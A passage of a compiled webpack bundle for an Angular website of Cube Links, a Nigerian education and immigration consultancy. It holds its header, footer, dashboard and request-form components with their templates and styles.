/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "CubeDashboardComponent", function() { return CubeDashboardComponent; });
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
var __decorate = (undefined && undefined.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (undefined && undefined.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};

var CubeDashboardComponent = /** @class */ (function () {
    function CubeDashboardComponent() {
    }
    CubeDashboardComponent.prototype.ngOnInit = function () {
    };
    CubeDashboardComponent = __decorate([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_0__["Component"])({
            selector: 'app-cube-dashboard',
            template: __webpack_require__(/*! ./cube-dashboard.component.html */ "./src/app/cube/cube-dashboard/cube-dashboard.component.html"),
            styles: [__webpack_require__(/*! ./cube-dashboard.component.scss */ "./src/app/cube/cube-dashboard/cube-dashboard.component.scss")]
        }),
        __metadata("design:paramtypes", [])
    ], CubeDashboardComponent);
    return CubeDashboardComponent;
}());



/***/ }),

/***/ "./src/app/cube/cube-footer/cube-footer.component.html":
/*!*************************************************************!*\
  !*** ./src/app/cube/cube-footer/cube-footer.component.html ***!
  \*************************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "<section class=\"footer-container\">\n  <div class=\"footer-top\">\n    <section class=\"footer-column\">\n      Cube Links specializes in both Education and Immigration Services.\n      We specialize in guiding and placing students into Canadian, Irish, United Kingdom and United States Universities\n    </section>\n    <section class=\"footer-column\">\n      <span class=\"footer-feature\">\n        EXPLORE\n      </span>\n      <ul>\n          <li>GALLERY</li>\n          <li>TESTIMONIAL</li>\n          <li>FAQs</li>\n          <li>OPEN LETTERS</li>\n        </ul>\n    </section>\n    <section class=\"footer-column\">\n        <span class=\"footer-feature\">\n          CONNECT\n          </span>\n          <ul>\n              <li>ALUMINI</li>\n              <li>AMBASSADORS</li>\n              <li>SOCIAL MEDIA</li>\n              <li>ASK THE INSTRUCTOR</li>\n              <li>CAREER</li>\n            </ul>\n    </section>\n    <section class=\"footer-column\">\n        <span class=\"footer-feature\">\n        CONTACTS US\n          </span>\n          <ul>\n            <li>\n              23, Rasheed Adigun street, Agura, Ikorodu, Lagos State\n            </li>\n            <li>+234 7050522615</li>\n            <li>cubelinksa1@gmail.com\n            </li>\n          </ul>\n    </section>\n  </div>\n  <div class=\"footer-bottom\">\n    @2019 Cube Links specializes in both Education and Immigration Services. designed by Extreme Tooling solution\n  </div>\n</section>\n"

/***/ }),

/***/ "./src/app/cube/cube-footer/cube-footer.component.scss":
/*!*************************************************************!*\
  !*** ./src/app/cube/cube-footer/cube-footer.component.scss ***!
  \*************************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "@media only screen and (max-width: 500px) {\n  .footer-top {\n    width: 100%;\n    display: flex;\n    flex-direction: column;\n    flex-wrap: wrap; }\n  .footer-column {\n    width: inherit; } }\n\n.footer-container {\n  display: flex;\n  width: 100%;\n  flex-direction: column;\n  background: #18184a;\n  color: whitesmoke;\n  min-height: 250px; }\n\n.footer-column {\n  min-width: 250px;\n  margin: 20px 20px; }\n\n.footer-top {\n  display: flex;\n  justify-content: center; }\n\n.footer-bottom {\n  max-height: 150px;\n  display: flex;\n  align-self: center; }\n\n/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIi9Vc2Vycy92dWRlZGlib3IvRGVza3RvcC9jdWJlbGlua3Mvc3JjL2FwcC9jdWJlL2N1YmUtZm9vdGVyL2N1YmUtZm9vdGVyLmNvbXBvbmVudC5zY3NzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiJBQUFBO0VBQ0k7SUFDSSxZQUFXO0lBQ1gsY0FBYTtJQUNiLHVCQUFzQjtJQUN0QixnQkFBZSxFQUNsQjtFQUNEO0lBQ0ksZUFBYyxFQUNqQixFQUFBOztBQUVMO0VBQ0ksY0FBYTtFQUNiLFlBQVc7RUFDWCx1QkFBc0I7RUFDdEIsb0JBQW1CO0VBQ2Ysa0JBQWlCO0VBQ2xCLGtCQUFpQixFQUN2Qjs7QUFDRDtFQUNJLGlCQUFlO0VBQ2Ysa0JBQWlCLEVBQ3BCOztBQUNEO0VBQ0ksY0FBYTtFQUNiLHdCQUF1QixFQUMxQjs7QUFDRDtFQUNJLGtCQUFnQjtFQUNoQixjQUFhO0VBQ2IsbUJBQWtCLEVBQ3JCIiwiZmlsZSI6InNyYy9hcHAvY3ViZS9jdWJlLWZvb3Rlci9jdWJlLWZvb3Rlci5jb21wb25lbnQuc2NzcyIsInNvdXJjZXNDb250ZW50IjpbIkBtZWRpYSBvbmx5IHNjcmVlbiBhbmQgKG1heC13aWR0aDogNTAwcHgpIHtcbiAgICAuZm9vdGVyLXRvcCB7XG4gICAgICAgIHdpZHRoOiAxMDAlO1xuICAgICAgICBkaXNwbGF5OiBmbGV4O1xuICAgICAgICBmbGV4LWRpcmVjdGlvbjogY29sdW1uO1xuICAgICAgICBmbGV4LXdyYXA6IHdyYXA7XG4gICAgfVxuICAgIC5mb290ZXItY29sdW1uIHtcbiAgICAgICAgd2lkdGg6IGluaGVyaXQ7XG4gICAgfVxufVxuLmZvb3Rlci1jb250YWluZXIge1xuICAgIGRpc3BsYXk6IGZsZXg7XG4gICAgd2lkdGg6IDEwMCU7XG4gICAgZmxleC1kaXJlY3Rpb246IGNvbHVtbjtcbiAgICBiYWNrZ3JvdW5kOiAjMTgxODRhO1xuICAgICAgICBjb2xvcjogd2hpdGVzbW9rZTtcbiAgICAgICBtaW4taGVpZ2h0OiAyNTBweDtcbn1cbi5mb290ZXItY29sdW1uIHtcbiAgICBtaW4td2lkdGg6MjUwcHg7XG4gICAgbWFyZ2luOiAyMHB4IDIwcHg7XG59XG4uZm9vdGVyLXRvcCB7XG4gICAgZGlzcGxheTogZmxleDtcbiAgICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjtcbn1cbi5mb290ZXItYm90dG9tIHtcbiAgICBtYXgtaGVpZ2h0OjE1MHB4O1xuICAgIGRpc3BsYXk6IGZsZXg7XG4gICAgYWxpZ24tc2VsZjogY2VudGVyO1xufSJdfQ== */"

/***/ }),

/***/ "./src/app/cube/cube-footer/cube-footer.component.ts":
/*!***********************************************************!*\
  !*** ./src/app/cube/cube-footer/cube-footer.component.ts ***!
  \***********************************************************/
/*! exports provided: CubeFooterComponent */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "CubeFooterComponent", function() { return CubeFooterComponent; });
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
var __decorate = (undefined && undefined.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (undefined && undefined.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};

var CubeFooterComponent = /** @class */ (function () {
    function CubeFooterComponent() {
    }
    CubeFooterComponent.prototype.ngOnInit = function () {
    };
    CubeFooterComponent = __decorate([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_0__["Component"])({
            selector: 'app-cube-footer',
            template: __webpack_require__(/*! ./cube-footer.component.html */ "./src/app/cube/cube-footer/cube-footer.component.html"),
            styles: [__webpack_require__(/*! ./cube-footer.component.scss */ "./src/app/cube/cube-footer/cube-footer.component.scss")]
        }),
        __metadata("design:paramtypes", [])
    ], CubeFooterComponent);
    return CubeFooterComponent;
}());



/***/ }),

/***/ "./src/app/cube/cube-header/cube-header.component.html":
/*!*************************************************************!*\
  !*** ./src/app/cube/cube-header/cube-header.component.html ***!
  \*************************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "<div class=\"container\">\n      <header class=\"cube-header\" >\n          <div>\n              <span class=\"contact-group\">\n                  <i class=\"fa fa-phone\"></i>\n                  <span class=\"contact-number\">+234 7050522615</span>\n                </span>\n                <span class=\"contact-group\">\n                    <i class=\"fa fa-phone\"></i>\n                    <span class=\"contact-number\">+234 7062344673</span>\n                </span>\n                <span class=\"contact-group\">\n                  <i class=\"fa fa-envelope\"></i>\n                  <span class=\"contact-number\">cubelinksa1@gmail.com</span>\n                </span>\n               \n          </div>\n          <div>\n              <span><i class=\"fa fa-facebook\"></i></span>\n              <span><i class=\"fa fa-instagram\"></i></span>\n          </div>\n          \n        </header>\n        <section>\n            <span>\n              <img src=\"\" />\n            </span>\n            <div class=\"cube-links\">\n                CUBE  LINKS\n            </div> \n            <div class=\"edu-service\">\n                INTERNATIONAL EDUCATIONAL SERVICES\n            </div>\n        </section>\n  </div>\n"

/***/ }),

/***/ "./src/app/cube/cube-header/cube-header.component.scss":
/*!*************************************************************!*\
  !*** ./src/app/cube/cube-header/cube-header.component.scss ***!
  \*************************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = ".container {\n  display: flex;\n  flex-direction: column;\n  width: 100%; }\n\nheader {\n  background: black;\n  color: whitesmoke;\n  font-size: 15px;\n  width: 100%;\n  display: flex;\n  min-height: 30px;\n  align-items: center;\n  justify-content: space-between;\n  font-weight: 700;\n  font-family: \"roboto\"; }\n\n.contact-group {\n  width: 100%; }\n\ni {\n  margin: 0 0 10px 10px;\n  color: #c0c0e5;\n  font-weight: 700; }\n\nsection {\n  display: flex;\n  flex-direction: column;\n  width: 100%;\n  justify-content: center;\n  cursor: pointer; }\n\n.cube-links {\n  font-weight: 900;\n  font-size: xx-large;\n  font-family: 'Advent Pro';\n  color: #1a1a4e; }\n\n.edu-service {\n  font-weight: 900;\n  font-size: large;\n  font-family: 'Advent Pro';\n  color: #1a1a4e; }\n\n.cube-links-subheader {\n  font-weight: 700;\n  font-size: large; }\n\n/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIi9Vc2Vycy92dWRlZGlib3IvRGVza3RvcC9jdWJlbGlua3Mvc3JjL2FwcC9jdWJlL2N1YmUtaGVhZGVyL2N1YmUtaGVhZGVyLmNvbXBvbmVudC5zY3NzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiJBQUdBO0VBQ0ksY0FBYTtFQUNiLHVCQUFzQjtFQUN0QixZQUFXLEVBQ2Q7O0FBQ0Q7RUFDSSxrQkFBaUI7RUFDakIsa0JBQWlCO0VBQ2pCLGdCQUFlO0VBQ2YsWUFBVTtFQUNWLGNBQWE7RUFDYixpQkFBZ0I7RUFDaEIsb0JBQW1CO0VBQ25CLCtCQUE4QjtFQUM5QixpQkFBZ0I7RUFDaEIsc0JBQXFCLEVBQ3hCOztBQUVEO0VBQ0ksWUFBVyxFQUNkOztBQUNEO0VBQ0ksc0JBQXFCO0VBQ3JCLGVBQXlCO0VBQ3pCLGlCQUFnQixFQUNuQjs7QUFDRDtFQUNJLGNBQWE7RUFDYix1QkFBc0I7RUFDdEIsWUFBVztFQUNYLHdCQUF1QjtFQUN2QixnQkFBZSxFQUNsQjs7QUFDRDtFQUNJLGlCQUFnQjtFQUNoQixvQkFBbUI7RUFDbkIsMEJBQXlCO0VBQ3pCLGVBQWMsRUFDakI7O0FBQ0Q7RUFDSSxpQkFBZ0I7RUFDaEIsaUJBQWdCO0VBQ2hCLDBCQUF5QjtFQUN6QixlQUFjLEVBQ2pCOztBQUNEO0VBQ0ksaUJBQWdCO0VBQ2hCLGlCQUFnQixFQUNuQiIsImZpbGUiOiJzcmMvYXBwL2N1YmUvY3ViZS1oZWFkZXIvY3ViZS1oZWFkZXIuY29tcG9uZW50LnNjc3MiLCJzb3VyY2VzQ29udGVudCI6WyIqIHtcbiAgICBcbn1cbi5jb250YWluZXJ7XG4gICAgZGlzcGxheTogZmxleDtcbiAgICBmbGV4LWRpcmVjdGlvbjogY29sdW1uO1xuICAgIHdpZHRoOiAxMDAlO1xufVxuaGVhZGVyIHtcbiAgICBiYWNrZ3JvdW5kOiBibGFjaztcbiAgICBjb2xvcjogd2hpdGVzbW9rZTtcbiAgICBmb250LXNpemU6IDE1cHg7XG4gICAgd2lkdGg6MTAwJTtcbiAgICBkaXNwbGF5OiBmbGV4O1xuICAgIG1pbi1oZWlnaHQ6IDMwcHg7XG4gICAgYWxpZ24taXRlbXM6IGNlbnRlcjtcbiAgICBqdXN0aWZ5LWNvbnRlbnQ6IHNwYWNlLWJldHdlZW47XG4gICAgZm9udC13ZWlnaHQ6IDcwMDtcbiAgICBmb250LWZhbWlseTogXCJyb2JvdG9cIjtcbn1cblxuLmNvbnRhY3QtZ3JvdXAge1xuICAgIHdpZHRoOiAxMDAlO1xufVxuaSB7XG4gICAgbWFyZ2luOiAwIDAgMTBweCAxMHB4O1xuICAgIGNvbG9yOiByZ2IoMTkyLCAxOTIsIDIyOSk7XG4gICAgZm9udC13ZWlnaHQ6IDcwMDtcbn1cbnNlY3Rpb24ge1xuICAgIGRpc3BsYXk6IGZsZXg7XG4gICAgZmxleC1kaXJlY3Rpb246IGNvbHVtbjtcbiAgICB3aWR0aDogMTAwJTtcbiAgICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjtcbiAgICBjdXJzb3I6IHBvaW50ZXI7XG59XG4uY3ViZS1saW5rc3tcbiAgICBmb250LXdlaWdodDogOTAwO1xuICAgIGZvbnQtc2l6ZTogeHgtbGFyZ2U7XG4gICAgZm9udC1mYW1pbHk6ICdBZHZlbnQgUHJvJzsgXG4gICAgY29sb3I6ICMxYTFhNGU7XG59XG4uZWR1LXNlcnZpY2Uge1xuICAgIGZvbnQtd2VpZ2h0OiA5MDA7XG4gICAgZm9udC1zaXplOiBsYXJnZTtcbiAgICBmb250LWZhbWlseTogJ0FkdmVudCBQcm8nOyBcbiAgICBjb2xvcjogIzFhMWE0ZTtcbn1cbi5jdWJlLWxpbmtzLXN1YmhlYWRlciB7XG4gICAgZm9udC13ZWlnaHQ6IDcwMDtcbiAgICBmb250LXNpemU6IGxhcmdlO1xufSJdfQ== */"

/***/ }),

/***/ "./src/app/cube/cube-header/cube-header.component.ts":
/*!***********************************************************!*\
  !*** ./src/app/cube/cube-header/cube-header.component.ts ***!
  \***********************************************************/
/*! exports provided: CubeHeaderComponent */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "CubeHeaderComponent", function() { return CubeHeaderComponent; });
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
var __decorate = (undefined && undefined.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (undefined && undefined.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};

var CubeHeaderComponent = /** @class */ (function () {
    function CubeHeaderComponent() {
    }
    CubeHeaderComponent.prototype.ngOnInit = function () {
    };
    CubeHeaderComponent = __decorate([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_0__["Component"])({
            selector: 'app-cube-header',
            template: __webpack_require__(/*! ./cube-header.component.html */ "./src/app/cube/cube-header/cube-header.component.html"),
            styles: [__webpack_require__(/*! ./cube-header.component.scss */ "./src/app/cube/cube-header/cube-header.component.scss")]
        }),
        __metadata("design:paramtypes", [])
    ], CubeHeaderComponent);
    return CubeHeaderComponent;
}());



/***/ }),

/***/ "./src/app/cube/cube.component.css":
/*!*****************************************!*\
  !*** ./src/app/cube/cube.component.css ***!
  \*****************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "\napp-cube-header {\n    background: whitesmoke;\n}\n@media only screen and (max-width: 500px) {\n    width: 500px;\n}\n/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbInNyYy9hcHAvY3ViZS9jdWJlLmNvbXBvbmVudC5jc3MiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6IjtBQUNBO0lBQ0ksdUJBQXVCO0NBQzFCO0FBQ0Q7SUFDSSxhQUFhO0NBQ2hCIiwiZmlsZSI6InNyYy9hcHAvY3ViZS9jdWJlLmNvbXBvbmVudC5jc3MiLCJzb3VyY2VzQ29udGVudCI6WyJcbmFwcC1jdWJlLWhlYWRlciB7XG4gICAgYmFja2dyb3VuZDogd2hpdGVzbW9rZTtcbn1cbkBtZWRpYSBvbmx5IHNjcmVlbiBhbmQgKG1heC13aWR0aDogNTAwcHgpIHtcbiAgICB3aWR0aDogNTAwcHg7XG59Il19 */"

/***/ }),

/***/ "./src/app/cube/cube.component.html":
/*!******************************************!*\
  !*** ./src/app/cube/cube.component.html ***!
  \******************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "<app-cube-header></app-cube-header>\n<app-cube-dashboard></app-cube-dashboard>\n<router-outlet></router-outlet>\n<app-cube-footer></app-cube-footer>"

/***/ }),

/***/ "./src/app/cube/cube.component.ts":
/*!****************************************!*\
  !*** ./src/app/cube/cube.component.ts ***!
  \****************************************/
/*! exports provided: CubeComponent */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "CubeComponent", function() { return CubeComponent; });
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
var __decorate = (undefined && undefined.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (undefined && undefined.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};

var CubeComponent = /** @class */ (function () {
    function CubeComponent() {
    }
    CubeComponent.prototype.ngOnInit = function () {
    };
    CubeComponent = __decorate([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_0__["Component"])({
            selector: 'app-cube',
            template: __webpack_require__(/*! ./cube.component.html */ "./src/app/cube/cube.component.html"),
            styles: [__webpack_require__(/*! ./cube.component.css */ "./src/app/cube/cube.component.css")]
        }),
        __metadata("design:paramtypes", [])
    ], CubeComponent);
    return CubeComponent;
}());



/***/ }),

/***/ "./src/app/cube/request/request.component.html":
/*!*****************************************************!*\
  !*** ./src/app/cube/request/request.component.html ***!
  \*****************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "<section class=\"request\">\n  <div class=\"request-inner\">\n    <span class=\"welcome-header\">\n        WELCOME TO CUBE LINKS\n      </span>\n    <span class=\"welcome-note\">\n        Cube Links Educational Services has been on the success trail where facilitating the future of \n        those aspiring to achieve great heights in their careers. Operating on the principles of competence,\n         reliability and affordability.\n       our team is made up of experienced travel consultants, career counsellors and academic instructors who provide reliable, time-tested and proven solutions to your travel abroad hassles—one that is suited to our clients’ academic and professional background.\n    </span>\n    <div class=\"request-row\">\n      <span></span>\n      <span></span>\n      <span></span>\n    </div>\n  </div>\n  <div class=\"form-container\" data-scroll-index=\"0\">\n      <div class=\"container\">\n        <span class=\"form-header\">\n          Quick Request\n        </span>\n        <span class=\"form-subheader\">\n          We value our prospective clients\n        </span>\n          <form >\n            <div class=\"form-group\">\n              <div>\n                  <label for=\"fname\">First Name</label>\n                  <input type=\"text\" id=\"fname\" name=\"firstname\" [(ngModel)]=\"firstName\" placeholder=\"Your name..\">\n              </div>\n              <div>\n                  <label for=\"fname\">Last Name</label>\n                  <input type=\"text\" id=\"fname\" name=\"lastname\" [(ngModel)]=\"lastName\" placeholder=\"Your last name..\">\n              </div>\n            </div>\n\n            <div class=\"\">\n                <label for=\"lname\">Email</label>\n                <input type=\"text\" id=\"lname\" name=\"email\" [(ngModel)]=\"email\" placeholder=\"Your email address..\">\n            </div>\n            <div class=\"form-group\">\n                <div>\n                    <label for=\"location\">Location</label>\n                    <input type=\"text\" id=\"location\" name=\"location\" [(ngModel)]=\"location\" placeholder=\"Your location..\">\n                </div>\n                <div>\n                    <label for=\"phonenumber\">Phone Number</label>\n                    <input type=\"text\" id=\"fname\" name=\"phonenumber\" [(ngModel)]=\"phoneNumber\" placeholder=\"Your phone Number..\">\n                </div>\n              </div>\n\n            <label for=\"subject\">message</label>\n            <textarea id=\"subject\" name=\"subject\" [(ngModel)]=\"message\" placeholder=\"Write something..\" style=\"height:150px\"></textarea>\n        \n            <input type=\"submit\" value=\"Submit\" (click)=\"recieveRequest()\">\n          </form>\n        </div>\n  </div>\n</section>\n"

/***/ }),

/***/ "./src/app/cube/request/request.component.scss":
/*!*****************************************************!*\
  !*** ./src/app/cube/request/request.component.scss ***!
  \*****************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "@media only screen and (max-width: 500px) {\n  .request {\n    width: 100%;\n    display: flex;\n    flex-direction: column;\n    flex-wrap: wrap; } }\n\nsection {\n  display: flex; }\n\n.request {\n  display: flex;\n  justify-content: space-around; }\n\n.request-row {\n  display: flex;\n  background: whitesmoke; }\n\n.request-inner {\n  display: flex;\n  flex-direction: column;\n  justify-content: center;\n  align-items: center; }\n\n.welcome-header {\n  font-family: \"Righteous\";\n  font-weight: bolder;\n  font-size: 30px; }\n\n.welcome-note {\n  max-width: 400px;\n  display: flex;\n  text-overflow: ellipsis;\n  flex-wrap: wrap;\n  font-weight: bold;\n  font-family: \"Righteous\"; }\n\nlabel {\n  font-weight: 700; }\n\n.form-header {\n  font-weight: 900;\n  font-size: 18px;\n  font-family: \"Advent Pro\";\n  color: brown; }\n\n.form-subheader {\n  font-weight: 900;\n  font-size: 15px;\n  color: brown; }\n\n.form-group {\n  display: flex; }\n\n.form-container {\n  min-height: 300px; }\n\ninput[type=text], textarea {\n  width: 100%;\n  padding: 12px;\n  border: 1px solid #ccc;\n  border-radius: 4px;\n  box-sizing: border-box;\n  margin-top: 6px;\n  margin-bottom: 10px;\n  resize: vertical; }\n\ninput[type=email], textarea {\n  min-width: 400px; }\n\ninput[type=submit] {\n  background-color: #4CAF50;\n  color: white;\n  padding: 12px 20px;\n  border: none;\n  border-radius: 4px;\n  cursor: pointer; }\n\ninput[type=submit]:hover {\n  background-color: #45a049; }\n\n.container {\n  border-radius: 5px;\n  display: flex;\n  flex-direction: column;\n  background-color: #f2f2f2;\n  padding: 20px; }\n\n/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIi9Vc2Vycy92dWRlZGlib3IvRGVza3RvcC9jdWJlbGlua3Mvc3JjL2FwcC9jdWJlL3JlcXVlc3QvcmVxdWVzdC5jb21wb25lbnQuc2NzcyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiQUFBQTtFQUNJO0lBQ0ksWUFBVztJQUNYLGNBQWE7SUFDYix1QkFBc0I7SUFDdEIsZ0JBQWUsRUFDbEIsRUFBQTs7QUFFTDtFQUNJLGNBQWEsRUFDaEI7O0FBQ0Q7RUFDSSxjQUFhO0VBQ2IsOEJBQTZCLEVBQ2hDOztBQUNEO0VBQ0ksY0FBYTtFQUNiLHVCQUFzQixFQUV6Qjs7QUFDRDtFQUNJLGNBQWE7RUFDYix1QkFBc0I7RUFDdEIsd0JBQXVCO0VBQ3ZCLG9CQUFtQixFQUN0Qjs7QUFDRDtFQUNJLHlCQUF3QjtFQUN4QixvQkFBbUI7RUFDbkIsZ0JBQWUsRUFDbEI7O0FBQ0Q7RUFDQSxpQkFBZ0I7RUFDaEIsY0FBYTtFQUNiLHdCQUF1QjtFQUN2QixnQkFBZTtFQUNmLGtCQUFpQjtFQUNqQix5QkFBd0IsRUFDdkI7O0FBQ0Q7RUFDSSxpQkFBZ0IsRUFDbkI7O0FBQ0Q7RUFDSSxpQkFBZ0I7RUFDaEIsZ0JBQWU7RUFDZiwwQkFBeUI7RUFDekIsYUFDSixFQUFDOztBQUNEO0VBQ0ksaUJBQWdCO0VBQ2hCLGdCQUFlO0VBQ2YsYUFDSixFQUFDOztBQUNEO0VBQ0ksY0FBYSxFQUNoQjs7QUFFRDtFQUNJLGtCQUFpQixFQUNwQjs7QUFDRDtFQUNJLFlBQVc7RUFDWCxjQUFhO0VBQ2IsdUJBQXNCO0VBQ3RCLG1CQUFrQjtFQUNsQix1QkFBc0I7RUFDdEIsZ0JBQWU7RUFDZixvQkFBbUI7RUFDbkIsaUJBQWdCLEVBQ2pCOztBQUNEO0VBQ0ksaUJBQWdCLEVBQ25COztBQUVEO0VBQ0UsMEJBQXlCO0VBQ3pCLGFBQVk7RUFDWixtQkFBa0I7RUFDbEIsYUFBWTtFQUNaLG1CQUFrQjtFQUNsQixnQkFBZSxFQUNoQjs7QUFFRDtFQUNFLDBCQUF5QixFQUMxQjs7QUFFRDtFQUNFLG1CQUFrQjtFQUNsQixjQUFhO0VBQ2IsdUJBQXNCO0VBQ3RCLDBCQUF5QjtFQUN6QixjQUFhLEVBQ2QiLCJmaWxlIjoic3JjL2FwcC9jdWJlL3JlcXVlc3QvcmVxdWVzdC5jb21wb25lbnQuc2NzcyIsInNvdXJjZXNDb250ZW50IjpbIkBtZWRpYSBvbmx5IHNjcmVlbiBhbmQgKG1heC13aWR0aDogNTAwcHgpIHtcbiAgICAucmVxdWVzdCB7XG4gICAgICAgIHdpZHRoOiAxMDAlO1xuICAgICAgICBkaXNwbGF5OiBmbGV4O1xuICAgICAgICBmbGV4LWRpcmVjdGlvbjogY29sdW1uO1xuICAgICAgICBmbGV4LXdyYXA6IHdyYXA7XG4gICAgfVxufVxuc2VjdGlvbiB7XG4gICAgZGlzcGxheTogZmxleDtcbn1cbi5yZXF1ZXN0IHtcbiAgICBkaXNwbGF5OiBmbGV4O1xuICAgIGp1c3RpZnktY29udGVudDogc3BhY2UtYXJvdW5kO1xufVxuLnJlcXVlc3Qtcm93IHtcbiAgICBkaXNwbGF5OiBmbGV4O1xuICAgIGJhY2tncm91bmQ6IHdoaXRlc21va2U7XG5cbn1cbi5yZXF1ZXN0LWlubmVyIHtcbiAgICBkaXNwbGF5OiBmbGV4O1xuICAgIGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47XG4gICAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7XG4gICAgYWxpZ24taXRlbXM6IGNlbnRlcjtcbn1cbi53ZWxjb21lLWhlYWRlciB7XG4gICAgZm9udC1mYW1pbHk6IFwiUmlnaHRlb3VzXCI7XG4gICAgZm9udC13ZWlnaHQ6IGJvbGRlcjtcbiAgICBmb250LXNpemU6IDMwcHg7XG59XG4ud2VsY29tZS1ub3RlIHtcbm1heC13aWR0aDogNDAwcHg7XG5kaXNwbGF5OiBmbGV4O1xudGV4dC1vdmVyZmxvdzogZWxsaXBzaXM7XG5mbGV4LXdyYXA6IHdyYXA7XG5mb250LXdlaWdodDogYm9sZDtcbmZvbnQtZmFtaWx5OiBcIlJpZ2h0ZW91c1wiO1xufVxubGFiZWwge1xuICAgIGZvbnQtd2VpZ2h0OiA3MDA7XG59XG4uZm9ybS1oZWFkZXIge1xuICAgIGZvbnQtd2VpZ2h0OiA5MDA7XG4gICAgZm9udC1zaXplOiAxOHB4O1xuICAgIGZvbnQtZmFtaWx5OiBcIkFkdmVudCBQcm9cIjtcbiAgICBjb2xvcjogYnJvd25cbn1cbi5mb3JtLXN1YmhlYWRlciB7XG4gICAgZm9udC13ZWlnaHQ6IDkwMDtcbiAgICBmb250LXNpemU6IDE1cHg7XG4gICAgY29sb3I6IGJyb3duXG59XG4uZm9ybS1ncm91cCB7XG4gICAgZGlzcGxheTogZmxleDtcbn1cblxuLmZvcm0tY29udGFpbmVyIHtcbiAgICBtaW4taGVpZ2h0OiAzMDBweDsgXG59XG5pbnB1dFt0eXBlPXRleHRdLCAgdGV4dGFyZWEge1xuICAgIHdpZHRoOiAxMDAlO1xuICAgIH